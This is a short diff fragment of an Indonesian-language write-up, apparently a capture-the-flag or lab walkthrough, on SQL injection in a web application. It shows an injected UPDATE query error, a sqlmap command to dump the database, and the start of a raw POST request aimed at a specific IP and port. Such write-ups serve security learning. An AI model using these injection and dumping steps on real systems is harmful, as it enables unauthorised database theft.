@@ -16,10 +16,10 @@ UPDATE `secret` SET `judul` = 'a'', `secret` = 'a' WHERE `id` = '1431944397'You 
 ```
 3. Gunakan tools sqlmap untuk mempercepat proses dump database.<br/>
 command :<br/>
-``sqlmap -r exploit.txt --dump``
-<br/>
+``sqlmap -r exploit.txt --dump``<br/>
 dengan isi file exploit.txt sebagai berikut :<br/><br/>
 ```
+
 POST /page.php?f=editsecret&id=<your-id> HTTP/1.1
 Host: 103.171.85.90:8082
 User-Agent: <user-agent>
